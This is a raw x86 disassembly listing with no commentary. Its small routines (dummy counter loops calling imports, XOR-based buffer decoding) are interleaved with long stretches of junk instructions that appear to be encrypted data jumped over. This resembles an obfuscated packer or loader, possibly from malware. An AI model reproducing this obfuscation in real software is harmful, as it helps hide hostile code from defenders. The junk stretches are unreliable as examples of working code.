  402852:	fisubr DWORD PTR [eax+0x2f02f8de]
  402858:	lock xchg esi,eax
  40285a:	retf   
  40285b:	fdivr  QWORD PTR ds:0xb7af2d97
  402861:	daa    
  402862:	push   ds
  402863:	xor    DWORD PTR [ebp+0x3bee2922],eax
  402869:	inc    edx
  40286a:	adc    edx,DWORD PTR [ecx]
  40286c:	lods   eax,DWORD PTR gs:[esi]
  40286e:	xchg   edx,eax
  40286f:	push   ebx
  402870:	rol    DWORD PTR [ebx-0x1e],1
  402873:	and    DWORD PTR [eax+0x13597327],ebp
  402879:	mov    gs:0x2db57d43,al
  40287f:	add    al,0x90
  402881:	in     al,dx
  402882:	or     ebp,esp
  402884:	sub    DWORD PTR [esi],0x33ca1b63
  40288a:	pop    esi
  40288b:	mov    DWORD PTR [ecx],eax
  40288d:	jmp    0x4028b6
  402892:	xor    DWORD PTR [ebp-0xc],0x5fd8c
  402899:	jmp    0x4028b6
  40289e:	mov    eax,DWORD PTR [ebp-0x8]
  4028a1:	mov    ecx,DWORD PTR [ebp-0x18]
  4028a4:	mov    ecx,DWORD PTR [ecx]
  4028a6:	mov    DWORD PTR [eax],ecx
  4028a8:	mov    eax,DWORD PTR [ebp+0xc]
  4028ab:	mov    eax,DWORD PTR [ebp+0x8]
  4028ae:	push   DWORD PTR [ebp-0x8]
  4028b1:	call   0x405275
  4028b6:	mov    eax,DWORD PTR [ebp-0xc]
  4028b9:	cmp    eax,ebx
  4028bb:	je     0x4015da
  4028c1:	mov    eax,DWORD PTR [ebp-0x8]
  4028c4:	mov    eax,DWORD PTR [eax]
  4028c6:	pop    edi
  4028c7:	pop    esi
  4028c8:	pop    ebx
  4028c9:	leave  
  4028ca:	ret    0xc
  4028cd:	push   ebp
  4028ce:	mov    ebp,esp
  4028d0:	sub    esp,0x18
  4028d3:	leave  
  4028d4:	ret    0x8
  4028d7:	push   ebp
  4028d8:	mov    ebp,esp
  4028da:	jmp    0x402a17
  4028df:	sbb    eax,0xb1fd9f1a
  4028e4:	jge    0x402943
  4028e6:	fidivr DWORD PTR [eax-0x2821fbaf]
  4028ec:	pop    esi
  4028ed:	push   ds
  4028ee:	in     al,dx
  4028ef:	push   ebx
  4028f0:	or     BYTE PTR [esi+0x7e],bh
  4028f3:	push   ds
  4028f4:	jg     0x402974
  4028f6:	jle    0x4028e6
  4028f8:	mov    eax,ds:0xe5cbe796
  4028fd:	aaa    
  4028fe:	int3   
  4028ff:	pusha  
  402900:	mov    al,0x41
  402902:	pop    ss
  402903:	inc    esi
  402904:	out    0xf1,eax
  402906:	das    
  402907:	or     ecx,DWORD PTR [edx-0x2]
  40290a:	pop    ebx
  40290b:	cmc    
  40290c:	xchg   dl,al
  40290e:	mov    dh,BYTE PTR [esi+0x729c3565]
  402914:	adc    BYTE PTR [esi-0x53],ch
  402917:	je     0x402974
  402919:	jb     0x4028f0
  40291b:	dec    edx
  40291c:	xor    eax,0x36c4d410
  402921:	inc    ebx
  402922:	xchg   edx,eax
  402923:	jb     0x402939
  402925:	and    BYTE PTR [esi+edi*2-0x70c6dc53],dh
  40292c:	dec    ebx
  40292d:	shr    dl,0x29
  402930:	imul   ebp,DWORD PTR [ecx-0x463819ee],0x7b30fe1a
  40293a:	push   es
  40293b:	(bad)  
  40293c:	pop    ds
  40293d:	pop    es
  40293e:	push   ds
  40293f:	or     bl,bl
  402941:	call   0x6218e11e
  402946:	in     eax,0x5d
  402948:	inc    ecx
  402949:	xchg   edx,eax
  40294a:	data16 and bh,BYTE PTR [ebp+edx*4-0x1d]
  40294f:	mov    WORD PTR [eax+0x3c940254],es
  402955:	fisub  DWORD PTR [edx+0x33]
  402958:	in     al,0xf8
  40295a:	xor    BYTE PTR [edi-0x330285f2],dh
  402960:	jno    0x402970
  402962:	fsub   QWORD PTR [ecx]
  402964:	inc    edi
  402965:	add    edx,edx
  402967:	cmp    DWORD PTR [esi],eax
  402969:	ja     0x402970
  40296b:	inc    edx
  40296c:	out    dx,eax
  40296d:	xor    dl,BYTE PTR [ebx+0x69c754c1]
  402973:	inc    ebp
  402974:	jmp    0x95be:0xddd139bc
  40297b:	repnz arpl dx,cx
  40297e:	clc    
  40297f:	out    0x4f,al
  402981:	and    ebp,0x2e0df75d
  402987:	pop    ebx
  402988:	je     0x402a05
  40298a:	push   edi
  40298b:	aad    0x72
  40298d:	mov    eax,0x40a152f6
  402992:	(bad)  
  402993:	loope  0x40296b
  402995:	cmp    BYTE PTR [ebp+ecx*8+0x671a0d9e],ch
  40299c:	scas   al,BYTE PTR es:[edi]
  40299d:	retf   0x91b3
  4029a0:	hlt    
  4029a1:	sbb    ah,BYTE PTR [esi]
  4029a3:	cld    
  4029a4:	loopne 0x402980
  4029a6:	sbb    cl,dh
  4029a8:	xor    dh,BYTE PTR [eax]
  4029aa:	push   ds
  4029ab:	cs sbb ecx,esi
  4029ae:	in     al,0x66
  4029b0:	push   DWORD PTR [edx]
  4029b2:	sbb    ebx,DWORD PTR [eax]
  4029b4:	ret    
  4029b5:	shl    DWORD PTR [esi+edi*2],0x38
  4029b9:	pop    ebx
  4029ba:	dec    esi
  4029bb:	mov    esp,0xa5bb8489
  4029c0:	ins    BYTE PTR es:[edi],dx
  4029c1:	aas    
  4029c2:	gs ss test al,0x3f
  4029c6:	scas   al,BYTE PTR es:[edi]
  4029c7:	fistp  QWORD PTR [eax+ecx*2-0x75]
  4029cb:	ret    0x83e9
  4029ce:	dec    eax
  4029cf:	stc    
  4029d0:	lods   eax,DWORD PTR ds:[esi]
  4029d1:	mov    dh,0x3f
  4029d3:	in     eax,dx
  4029d4:	rol    BYTE PTR [eax-0x59376164],1
  4029da:	addr16 test al,0x89
  4029dd:	nop
  4029de:	adc    al,0x55
  4029e0:	out    dx,eax
  4029e1:	mov    eax,ds:0xd2d42d1b
  4029e6:	push   esi
  4029e7:	imul   esp,DWORD PTR [edx-0x35],0x5c
  4029eb:	pushf  
  4029ec:	cmp    esp,ebx
  4029ee:	and    al,BYTE PTR [esi-0x2cfa5cd2]
  4029f4:	sti    
  4029f5:	mov    cl,0xb7
  4029f7:	and    ah,bh
  4029f9:	jne    0x402a21
  4029fb:	jle    0x402a62
  4029fd:	(bad)  
  4029fe:	pushf  
  4029ff:	push   esi
  402a00:	dec    eax
  402a01:	xchg   ecx,eax
  402a02:	test   BYTE PTR [ecx+ebp*8],dl
  402a05:	iret   
  402a06:	xor    dh,BYTE PTR [esi+0x53]
  402a09:	leave  
  402a0a:	stc    
  402a0b:	cmp    eax,0x3eab785d
  402a10:	xchg   edx,eax
  402a11:	jg     0x4029cf
  402a13:	sub    bl,BYTE PTR [ebp+ecx*1-0x1a]
  402a17:	push   ecx
  402a18:	and    DWORD PTR ds:0x434587,0x0
  402a22:	jmp    0x402a34
  402a27:	mov    edx,DWORD PTR ds:0x434587
  402a2d:	inc    edx
  402a2e:	mov    DWORD PTR ds:0x434587,edx
  402a34:	cmp    DWORD PTR ds:0x434587,0x17
  402a3b:	jae    0x402a84
  402a41:	cmp    DWORD PTR ds:0x434587,0x4
  402a48:	jne    0x402a59
  402a4e:	push   0x4344e3
  402a53:	call   DWORD PTR ds:0x413330
  402a59:	cmp    DWORD PTR ds:0x434587,0x3
  402a60:	jne    0x402a75
  402a66:	xor    edx,edx
  402a68:	or     edx,DWORD PTR ds:0x434587
  402a6e:	inc    edx
  402a6f:	mov    DWORD PTR ds:0x434587,edx
  402a75:	jmp    0x402a27
  402a7a:	xor    DWORD PTR ds:0x4344ff,0x2c9d
  402a84:	push   ecx
  402a85:	sbb    ecx,ecx
  402a87:	mov    eax,0xf89c8536
  402a8c:	sbb    DWORD PTR ds:0x43453b,edi
  402a92:	mov    DWORD PTR [ebp-0x8],eax
  402a95:	and    DWORD PTR ds:0x434577,0x0
  402a9f:	mov    ecx,DWORD PTR ds:0x434577
  402aa5:	inc    ecx
  402aa6:	mov    DWORD PTR ds:0x434577,ecx
  402aac:	cmp    DWORD PTR ds:0x434577,0x25
  402ab3:	jne    0x402ac4
  402ab9:	push   0x8c9d
  402abe:	call   DWORD PTR ds:0x4133f4
  402ac4:	cmp    DWORD PTR ds:0x434577,0x19
  402acb:	jb     0x402a9f
  402ad1:	add    ecx,DWORD PTR ds:0x43460f
  402ad7:	mov    DWORD PTR [ebp-0x4],0xf89c8539
  402ade:	mov    edx,DWORD PTR [ebp-0x8]
  402ae1:	push   esi
  402ae2:	mov    ecx,DWORD PTR ds:0x4345fb
  402ae8:	or     DWORD PTR ds:0x4345c7,ecx
  402aee:	mov    ecx,0x7510851
  402af3:	xor    edx,ecx
  402af5:	mov    esi,0x327299
  402afa:	push   edi
  402afb:	add    DWORD PTR ds:0x4345b7,ebx
  402b01:	mov    edi,DWORD PTR [ebp+0x10]
  402b04:	sbb    DWORD PTR ds:0x4345c3,0x434503
  402b0e:	jmp    0x402c4b
  402b13:	pop    ss
  402b14:	imul   ecx,DWORD PTR ds:0x7d726d66,0xc1f40369
  402b1e:	(bad)  
  402b1f:	and    al,BYTE PTR [ecx+0x97398ac]
  402b25:	jle    0x402ba5
  402b27:	push   ds
  402b28:	jg     0x402ba8
  402b2a:	jle    0x402b7e
  402b2c:	adc    al,0x9f
  402b2e:	cs mov esp,0x781af786
  402b34:	inc    edx
  402b35:	hlt    
  402b36:	ins    DWORD PTR es:[edi],dx
  402b37:	out    dx,al
  402b38:	dec    esp
  402b39:	mov    cl,0x87
  402b3b:	inc    eax
  402b3c:	loope  0x402adb
  402b3e:	cmp    dh,BYTE PTR [ebx]
  402b40:	xor    BYTE PTR [esi-0x5effd89e],0x7c
  402b47:	and    bl,dl
  402b49:	sbb    BYTE PTR [edx+0xe],ah
  402b4c:	inc    ebx
  402b4d:	dec    esp
  402b4e:	push   ecx
  402b4f:	repnz arpl bp,si
  402b52:	inc    DWORD PTR [eax-0x39f2995b]
  402b58:	in     eax,0xc7
  402b5a:	cmp    bh,BYTE PTR [eax-0x39bb9641]
  402b60:	imul   ecx,DWORD PTR [ebp+0x695a8a72],0xffffffa3
  402b67:	scas   al,BYTE PTR es:[edi]
  402b68:	xor    eax,0x8af8ec06
  402b6d:	inc    ebx
  402b6e:	call   0xa0fb44c6
  402b73:	mov    eax,0xad96fa8e
  402b78:	aas    
  402b79:	fidivr DWORD PTR [edx+0x4588e72c]
  402b7f:	fistp  WORD PTR [esi]
  402b81:	cmc    
  402b82:	fdiv   st,st(1)
  402b84:	xchg   esp,eax
  402b85:	xor    cl,al
  402b87:	xabort 0xff
  402b8a:	jne    0x402b76
  402b8c:	sbb    edx,ecx
  402b8e:	mov    ebx,0x7e8ac838
  402b93:	adc    bl,BYTE PTR ds:0x9cafb7d8
  402b99:	xor    dh,BYTE PTR [ebp-0x236fa15a]
  402b9f:	ja     0x402b39
  402ba1:	test   al,0x61
  402ba3:	sub    al,0xf5
  402ba5:	sub    eax,0x770637ff
  402baa:	mov    eax,ds:0x1f74cbdf
  402bb0:	push   0x28
  402bb2:	mov    ds:0x874fd748,eax
  402bb7:	mov    edx,0x1bb16881
  402bbc:	out    0x48,al
  402bbe:	jns    0x402b46
  402bc0:	mov    bh,0x30
  402bc2:	fsubr  QWORD PTR ds:0xfef13612
  402bc8:	xor    al,0x96
  402bca:	xchg   BYTE PTR [esi-0x3b],ah
  402bcd:	mov    DWORD PTR [ebp+0x70],ebx
  402bd0:	(bad)  
  402bd1:	or     BYTE PTR [eax-0xf],al
  402bd4:	and    eax,0xb79c7b52
  402bd9:	sub    WORD PTR [ebp+0x3f],di
  402bdd:	push   ebp
  402bde:	dec    esi
  402bdf:	outs   dx,BYTE PTR ds:[esi]
  402be0:	mov    dl,ch
  402be2:	(bad)  
  402be3:	fdivr  st(3),st
  402be5:	and    eax,0x585857d8
  402bea:	pop    edi
  402beb:	fist   DWORD PTR [edi+0x6c]
  402bee:	stos   DWORD PTR es:[edi],eax
  402bef:	pop    es
  402bf0:	adc    al,BYTE PTR [esi+ecx*4-0x8ef8e8e]
  402bf7:	(bad)  
  402bf8:	nop
  402bf9:	addr16 aad 0xf1
  402bfc:	jae    0x402ba0
  402bfe:	shl    DWORD PTR [ecx-0x686b9ab1],1
  402c04:	sbb    DWORD PTR [esi],ecx
  402c06:	push   esi
  402c07:	div    BYTE PTR [ebx]
  402c09:	test   DWORD PTR [esi+0x5b3356a0],ecx
  402c0f:	loopne 0x402ba7
  402c11:	inc    ecx
  402c12:	ja     0x402c87
  402c14:	xlat   BYTE PTR ds:[ebx]
  402c15:	mov    edx,0xbecfff68
  402c1a:	push   ss
  402c1b:	adc    al,0xe4
  402c1d:	jge    0x402c1d
  402c1f:	dec    esi
  402c20:	jp     0x402bf7
  402c22:	cmp    DWORD PTR [ebx+0x31],0xfffffffd
  402c26:	test   BYTE PTR [esi-0x7d1e6790],0xff
  402c2d:	call   0x85a4a173
  402c32:	iret   
  402c33:	outs   dx,BYTE PTR ds:[esi]
  402c34:	mov    ds:0xde0809f1,al
  402c3a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402c3b:	iret   
  402c3c:	xchg   edx,eax
  402c3d:	push   eax
  402c3e:	dec    ebx
  402c3f:	mov    ebp,0xc1585189
  402c44:	fcmovb st,st(7)
  402c46:	xchg   edx,eax
  402c47:	int    0x41
  402c49:	sbb    edx,DWORD PTR [edx-0x5c429fd]
  402c4f:	je     0x402e4c
  402c55:	and    DWORD PTR ds:0x434507,0x0
  402c5f:	mov    eax,ds:0x434507
  402c64:	inc    eax
  402c65:	mov    ds:0x434507,eax
  402c6a:	cmp    DWORD PTR ds:0x434507,0x17
  402c71:	jne    0x402c80
  402c77:	push   DWORD PTR [ebp-0xc]
  402c7a:	call   DWORD PTR ds:0x4133f8
  402c80:	cmp    DWORD PTR ds:0x434507,0x16
  402c87:	jb     0x402c5f
  402c8d:	xor    eax,0x6036
  402c92:	mov    edx,DWORD PTR [ebp-0x8]
  402c95:	mov    eax,DWORD PTR [ebp-0x4]
  402c98:	xor    eax,ecx
  402c9a:	mov    edi,0xffcd8d67
  402c9f:	xor    DWORD PTR ds:0x4344e7,0x434613
  402ca9:	sub    edi,eax
  402cab:	add    edi,DWORD PTR [ebp+0x10]
  402cae:	xor    edx,ecx
  402cb0:	add    edx,esi
  402cb2:	cmp    edx,edi
  402cb4:	ja     0x402e47
  402cba:	push   ebx
  402cbb:	jmp    0x402cc5
  402cc0:	mov    esi,0x327299
  402cc5:	mov    eax,DWORD PTR [ebp-0x8]
  402cc8:	mov    edi,DWORD PTR [ebp-0x4]
  402ccb:	xor    edi,ecx
  402ccd:	add    edi,esi
  402ccf:	mov    esi,DWORD PTR [ebp+0x8]
  402cd2:	imul   edi,edx
  402cd5:	jmp    0x402e12
  402cda:	push   ebp
  402cdb:	nop
  402cdc:	outs   dx,BYTE PTR ds:[esi]
  402cdd:	stos   DWORD PTR es:[edi],eax
  402cde:	jae    0x402d5d
  402ce0:	push   ebp
  402ce1:	jo     0x402cac
  402ce3:	sub    esi,esp
  402ce5:	lods   eax,DWORD PTR ds:[esi]
  402ce6:	not    BYTE PTR [ebx+0x3e]
  402ce9:	inc    edx
  402cea:	adc    ecx,DWORD PTR [ebx]
  402cec:	jle    0x402d6c
  402cee:	push   ds
  402cef:	jg     0x402d6f
  402cf1:	jle    0x402d1b
  402cf3:	sbb    ebx,esi
  402cf5:	daa    
  402cf6:	or     eax,DWORD PTR [edi]
  402cf8:	adc    al,0x3e
  402cfa:	or     DWORD PTR [eax],0xea8087d2
  402d00:	xchg   edx,eax
  402d01:	lea    esi,[ebx-0x3cb3bbbf]
  402d07:	lea    edi,ds:0xc578b38f
  402d0d:	aas    
  402d0e:	sbb    al,BYTE PTR [ecx-0x27d95038]
  402d14:	(bad)  
  402d15:	jne    0x402d70
  402d17:	push   0xffffff90
  402d19:	fdivrp st(1),st
  402d1b:	test   al,0xa
  402d1d:	stos   BYTE PTR es:[edi],al
  402d1e:	outs   dx,DWORD PTR ds:[esi]
  402d1f:	xor    DWORD PTR [esi-0x6a],edx
  402d22:	or     dl,cl
  402d24:	sub    DWORD PTR [esi-0x21],ebp
  402d27:	jbe    0x402d31
  402d29:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402d2a:	adc    BYTE PTR [eax+ebx*4-0x10a3ac19],ch
  402d31:	push   ebx
  402d32:	pushf  
  402d33:	or     bl,BYTE PTR [edx-0x4fb8e2b9]
  402d39:	cmp    dl,BYTE PTR [ecx+0x46637a46]
  402d3f:	inc    ebx
  402d40:	xor    eax,0x646b4923
  402d45:	mov    DWORD PTR [esi-0x5],ebp
  402d48:	cmp    esi,0xffffffaa
  402d4b:	mov    DWORD PTR ds:0xe4c98bf0,edx
  402d51:	daa    
  402d52:	xchg   edi,eax
  402d53:	dec    ebx
  402d54:	mov    WORD PTR [edi],es
  402d56:	cmp    ebp,DWORD PTR [ebx-0x5]
  402d59:	sub    ch,dh
  402d5b:	fdiv   DWORD PTR [edi-0x38647e1e]
  402d61:	aas    
  402d62:	enter  0x4901,0x47
  402d66:	cwde   
  402d67:	out    0xca,al
  402d69:	addr16 addr16 ss gs mov ebx,0x60599dee
  402d72:	adc    DWORD PTR ds:0x1e3c1373,0xed0406b1
  402d7c:	stos   DWORD PTR es:[edi],eax
  402d7d:	ss stos BYTE PTR es:[edi],al
  402d7f:	shl    DWORD PTR [ebp+0x7c],1
  402d82:	mov    ss,ebx
  402d84:	jb     0x402dfc
  402d86:	dec    ebx
  402d87:	lea    esp,[esi+0x49]
  402d8a:	lahf   
  402d8b:	mov    ebx,0xfb83a5a2
  402d90:	mov    dh,0x72
  402d92:	lahf   
  402d93:	test   eax,0xa9d4068f
  402d98:	addr16 (bad) 
  402d9a:	push   edi
  402d9b:	sbb    eax,DWORD PTR [eax+eiz*1]
  402d9e:	ins    DWORD PTR es:[edi],dx
  402d9f:	jno    0x402df8
  402da1:	test   BYTE PTR [esi-0x3a],al
  402da4:	adc    cl,bl
  402da6:	pop    edx
  402da7:	js     0x402d80
  402da9:	push   es
  402daa:	jnp    0x402d39
  402dac:	inc    ebx
  402dad:	test   BYTE PTR [ebx-0x32],0x25
  402db1:	das    
  402db2:	mov    ebx,0xda4ab322
  402db7:	cmp    DWORD PTR [edx+0x762cfc83],edx
  402dbd:	test   al,0x1a
  402dbf:	mov    esp,0xc27077cb
  402dc4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402dc5:	inc    ecx
  402dc6:	das    
  402dc7:	fwait
  402dc8:	pop    esi
  402dc9:	bound  ebp,QWORD PTR [edx]
  402dcb:	cmp    eax,0xa8239153
  402dd0:	sbb    dl,bl
  402dd2:	fwait
  402dd3:	ins    DWORD PTR es:[edi],dx
  402dd4:	imul   edx,DWORD PTR [esi-0x7d],0xffffffd3
  402dd8:	ja     0x402e04
  402dda:	jmp    0x562e:0xb9204838
  402de1:	aam    0x41
  402de3:	sbb    ch,BYTE PTR [edi-0x165ac5e0]
  402de9:	adc    eax,0x5601d73e
  402dee:	push   ebp
  402def:	sub    al,0xf9
  402df1:	xor    ah,BYTE PTR [eax+0x58]
  402df4:	fucom  st(4)
  402df6:	cmp    eax,0x77c19186
  402dfb:	sbb    DWORD PTR [edi-0x1d9e33bd],ebx
  402e01:	or     cl,bh
  402e03:	dec    ebx
  402e04:	pop    ss
  402e05:	and    esp,DWORD PTR [ebx+eiz*1-0x62]
  402e09:	sbb    eax,DWORD PTR [esi]
  402e0b:	arpl   WORD PTR [ecx],ax
  402e0d:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402e0f:	daa    
  402e10:	dec    ebx
  402e11:	add    cl,BYTE PTR [ebx-0x3eccf3a3]
  402e17:	add    eax,edx
  402e19:	mov    al,BYTE PTR [ebx+eax*1+0x327299]
  402e20:	mov    BYTE PTR [edi+esi*1],al
  402e23:	mov    eax,DWORD PTR [ebp-0x4]
  402e26:	xor    eax,ecx
  402e28:	lea    edx,[edx+eax*1+0x327299]
  402e2f:	mov    eax,DWORD PTR [ebp-0x4]
  402e32:	xor    eax,ecx
  402e34:	mov    esi,0xffcd8d67
  402e39:	sub    esi,eax
  402e3b:	add    esi,DWORD PTR [ebp+0x10]
  402e3e:	cmp    edx,esi
  402e40:	jbe    0x402cc0
  402e46:	pop    ebx
  402e47:	mov    eax,0xf89c8539
  402e4c:	pop    edi
  402e4d:	pop    esi
  402e4e:	leave  
  402e4f:	ret    0xc
  402e52:	push   ebp
  402e53:	mov    ebp,esp
  402e55:	mov    eax,DWORD PTR [ebp+0xc]
  402e58:	xor    edx,edx
  402e5a:	mov    ecx,0x7264fcae
  402e5f:	div    ecx
  402e61:	mov    ecx,DWORD PTR [ebp+0x10]
  402e64:	and    ecx,eax
  402e66:	or     ecx,0x81161d8c
  402e6c:	mov    eax,ecx
  402e6e:	pop    ebp
  402e6f:	ret    0x18
  402e72:	push   ebp
  402e73:	mov    ebp,esp
  402e75:	sub    esp,0x58
  402e78:	and    DWORD PTR ds:0x434577,edi
  402e7e:	mov    ecx,DWORD PTR [ebp+0x8]
  402e81:	jmp    0x403276
  402e86:	inc    ebx
  402e87:	dec    di
  402e89:	fwait
  402e8a:	imul   esi,DWORD PTR [ebx-0x4190998d],0xffffffd0
  402e91:	add    dl,BYTE PTR [ebp-0x60]
  402e94:	and    al,0xbe
  402e96:	xor    edx,DWORD PTR [esi+edi*2]
  402e99:	jle    0x402ef1
  402e9b:	jns    0x402f1b
  402e9d:	jle    0x402f19
  402e9f:	and    DWORD PTR [ecx],0xe04fe5fc
  402ea5:	fistp  WORD PTR [eax+0x1b375f2c]
  402eab:	push   0xffffff81
  402ead:	sahf   
  402eae:	loop   0x402e69
  402eb0:	xor    DWORD PTR [esi+0x3c082506],0x1
  402eb7:	fs xor al,0xf3
  402eba:	out    dx,eax
  402ebb:	into   
  402ebc:	lahf   
  402ebd:	jb     0x402f28
  402ebf:	mov    cl,BYTE PTR [edi+0x596bc143]
  402ec5:	stos   BYTE PTR es:[edi],al
  402ec6:	not    BYTE PTR [eax]
  402ec8:	in     eax,dx
  402ec9:	bound  esp,QWORD PTR ds:0xd82971d2
  402ecf:	pop    edx
  402ed0:	push   es
  402ed1:	xchg   edx,eax
  402ed2:	adc    DWORD PTR [esi-0x5db9f278],ebp
  402ed8:	stos   DWORD PTR es:[edi],eax
  402ed9:	jmp    0x480e0f97
  402ede:	and    al,0x76
  402ee0:	rcr    DWORD PTR [ecx+0x36732492],0xed
  402ee7:	repnz push ebx
  402ee9:	mov    edi,0x634fd95d
  402eee:	enter  0xa57a,0x72
  402ef2:	popf   
  402ef3:	and    BYTE PTR [ebp-0x3e],ah
  402ef6:	cld    
  402ef7:	out    dx,al
  402ef8:	pop    ebx
  402ef9:	xor    bl,0xf7
  402efc:	fsub   QWORD PTR [eax-0x118846d8]
  402f02:	leave  
  402f03:	xor    edx,DWORD PTR [esi+0xc0639a0]
  402f09:	inc    ebx
  402f0a:	xchg   DWORD PTR [edi-0x4aaa13b6],eax
  402f10:	dec    esp
  402f11:	jbe    0x402f5a
  402f13:	cli    
  402f14:	mov    ch,0xf9
  402f16:	jmp    0x18fbcffb
  402f1b:	retf   
  402f1c:	adc    DWORD PTR [ebp-0x54bfe27b],esp
  402f22:	push   cs
  402f23:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402f24:	jmp    0x402f66
  402f26:	push   ss
  402f27:	data16 cmp BYTE PTR [edi-0x1b],bl
  402f2b:	cmp    al,0xc2
  402f2d:	cmp    DWORD PTR [eax-0x3ebf2fba],0xffffffea
  402f34:	test   eax,0xbe4d7820
  402f39:	lock inc ebx
  402f3b:	ins    BYTE PTR es:[edi],dx
  402f3c:	mov    ds:0xb2e5c9e8,eax
  402f41:	in     al,dx
  402f42:	sub    BYTE PTR [esi+eax*1+0x9],0x85
  402f47:	fwait
  402f48:	cwde   
  402f49:	push   esi
  402f4a:	imul   edi,DWORD PTR [ebx+0x54],0xffffffd3
  402f4e:	repz leave 
  402f50:	cli    
  402f51:	or     ch,bl
  402f53:	push   cs
  402f54:	adc    eax,0x3f782634
  402f59:	push   ebp
  402f5a:	mov    ax,ds:0x15cff147
  402f60:	fsub   QWORD PTR [eax-0x60d7f46f]
  402f66:	fild   QWORD PTR [ebp+0x4fdd9d8e]
  402f6c:	adc    BYTE PTR [eax+eax*2],dh
  402f6f:	sbb    edx,DWORD PTR [edi]
  402f71:	sar    DWORD PTR [edi+eax*4+0x10c02303],1
  402f78:	jp     0x402f4a
  402f7a:	popa   
  402f7b:	repz or BYTE PTR [eax+0x4cd2c7ba],ah
  402f82:	dec    esi
  402f83:	inc    ebx
  402f84:	das    
  402f85:	sbb    DWORD PTR [ebx+0x50],esp
  402f88:	ds inc esi
  402f8a:	pop    eax
  402f8b:	fistp  DWORD PTR [ebp-0x2286760]
  402f91:	push   ebx
  402f92:	inc    eax
  402f93:	sbb    cl,cl
  402f95:	pop    edx
  402f96:	out    0x36,al
  402f98:	js     0x402fc9
  402f9a:	mov    ecx,0x7a828c7c
  402f9f:	fadd   QWORD PTR [ebp+0x2e]
  402fa2:	add    ebp,esp
  402fa4:	xchg   edi,eax
  402fa5:	fwait
  402fa6:	test   DWORD PTR [edx],eax
  402fa8:	jg     0x5a6327a4
  402fae:	sub    eax,0xcf14964c
  402fb3:	xor    BYTE PTR [ecx-0x82c5a60],dh
  402fb9:	or     DWORD PTR [ebp-0x6deafef4],edx
  402fbf:	test   eax,0x42111c6a
  402fc4:	test   al,0xad
  402fc6:	inc    ebp
  402fc7:	rcr    bl,0xa
  402fca:	mov    al,ds:0x6cb49cec
  402fcf:	cwde   
  402fd0:	mov    dh,0x6f
  402fd2:	xchg   edx,eax
  402fd3:	popf   
  402fd4:	jb     0x402ff8
  402fd6:	add    dl,cl
  402fd8:	xchg   edi,eax
  402fd9:	jnp    0x402f94
  402fdb:	jne    0x402fab
  402fdd:	ficomp DWORD PTR [ecx+0x25]
  402fe0:	gs out dx,al
  402fe2:	retf   0x613
  402fe5:	sahf   
  402fe6:	mov    ecx,DWORD PTR [ebx]
  402fe8:	rcl    BYTE PTR [esi+0x2f],cl
  402feb:	in     eax,0x9b
  402fed:	adc    eax,0xf8f285e4
  402ff2:	or     dh,BYTE PTR [edx+0x38]
  402ff5:	cmc    
  402ff6:	inc    eax
  402ff7:	std    
  402ff8:	inc    ebp
  402ff9:	jnp    0x40306b
  402ffb:	outs   dx,BYTE PTR ds:[esi]
  402ffc:	clc    
  402ffd:	(bad)  
  402ffe:	mov    edx,0xf14751a9
  403003:	jb     0x403037
  403005:	add    bl,bh
  403007:	mov    al,gs:0xb55885f8
  40300d:	add    al,0xe6
  40300f:	enter  0xa658,0x2
  403013:	out    dx,eax
  403014:	fidiv  DWORD PTR [edx-0x53]
  403017:	fmul   st,st(0)
  403019:	outs   dx,DWORD PTR ds:[esi]
  40301a:	mov    eax,0x4eeeba68
  40301f:	mov    ch,0x14
  403021:	pop    edi
  403022:	stos   BYTE PTR es:[edi],al
  403023:	and    cl,BYTE PTR [ecx+0x5f]
  403026:	pushf  
  403027:	je     0x40303c
  403029:	outs   dx,BYTE PTR ds:[esi]
  40302a:	(bad)  
  40302b:	bound  esp,QWORD PTR [esi]
  40302d:	ss push esi
  40302f:	nop
  403030:	mov    bh,0xa2
  403032:	pop    ss
  403033:	sub    DWORD PTR [esi-0x2f],esi
  403036:	push   0x68ea6ef9
  40303b:	push   ebp
  40303c:	sar    BYTE PTR [edi+0x1b474928],cl
  403042:	mov    cl,BYTE PTR [edx+0x52482007]
  403048:	mov    ecx,DWORD PTR [edx]
  40304a:	push   ecx
  40304b:	jp     0x40305e
  40304d:	xchg   edx,eax
  40304e:	jae    0x403016
  403050:	outs   dx,DWORD PTR ds:[esi]
  403051:	int3   
  403052:	cli    
  403053:	fld    QWORD PTR [esi+0x5e]
  403056:	jge    0x402fdf
  403058:	bound  ebx,QWORD PTR [edi+0x44]
  40305b:	repnz dec ebp
  40305d:	cli    
  40305e:	in     eax,0x9a
  403060:	adc    bl,BYTE PTR [eax-0x3b]
  403063:	clc    
  403064:	xor    eax,0x422e2e68
  403069:	cmp    al,0xa4
  40306b:	and    al,0x34
  40306d:	and    DWORD PTR [esi],ebx
  40306f:	fstp   QWORD PTR [edi]
  403071:	fs leave 
  403073:	mov    ecx,DWORD PTR [edi+esi*4-0x6b98ab30]
  40307a:	mov    eax,ds:0xf8cf4c7e
  40307f:	out    0x50,eax
  403081:	add    ah,BYTE PTR [esi-0x20]
  403084:	jno    0x403103
  403086:	pushf  
  403087:	or     ebp,ebx
  403089:	sbb    al,0x3b
  40308b:	or     ecx,ebp
  40308d:	mov    bh,0x58
  40308f:	pop    ecx
  403090:	jns    0x403063
  403092:	push   esi
  403093:	call   0x9548509f
  403098:	and    ebp,DWORD PTR [ecx]
  40309a:	inc    ebx
  40309b:	les    edx,FWORD PTR [edx]
  40309d:	ins    BYTE PTR es:[edi],dx
  40309e:	xchg   esi,eax
  40309f:	cld    
  4030a0:	mov    dl,0x9f
  4030a2:	jae    0x40306d
  4030a4:	sbb    BYTE PTR [esi],cl
  4030a6:	push   ecx
  4030a7:	jb     0x403051
  4030a9:	mov    edi,0xb653d18e
  4030ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4030af:	hlt    
  4030b0:	ins    BYTE PTR es:[edi],dx
  4030b1:	sub    eax,0x75639760
  4030b6:	ret    
  4030b7:	daa    
  4030b8:	sti    
  4030b9:	je     0x403121
  4030bb:	and    ebp,DWORD PTR [edx+0x177aae37]
  4030c1:	(bad)  
  4030c3:	xchg   DWORD PTR [ebp+0x67],edx
  4030c6:	pop    edi
  4030c7:	push   esi
  4030c8:	and    BYTE PTR es:[ecx+0x10],bl
  4030cc:	add    edx,DWORD PTR [edx]
